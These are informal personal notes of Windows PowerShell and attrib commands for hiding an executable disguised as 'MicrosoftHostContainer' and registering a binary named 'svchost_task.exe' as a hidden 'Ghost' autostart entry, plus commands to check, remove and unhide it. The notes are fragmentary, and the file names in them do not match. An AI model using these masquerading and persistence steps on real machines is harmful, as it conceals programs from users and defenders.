New project 
comming soon
still on progress...
2026

Stop-Process -Name "MicrosoftHostContainer" -Force

Hide 

attrib +h +s +r .\MicrosoftHostContainer.exe

The Registry Command

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftHostContainer" -Value "C:\Users\User\AppData\Roaming\Microsoft\Windows\Templates\svchost_task.exe" -PropertyType String

 Verification: How to see your "Ghost" entry

Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object MicrosoftHostContainer

check backgroudn running

Get-Process MicrosoftHostContainer -ErrorAction SilentlyContinue


REMOVE auto staart

Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftHostContainer"

stop running forc

Stop the Running "Ghost" Process

unhide

attrib -h -s -r .\MicrosoftHostContainer.exe



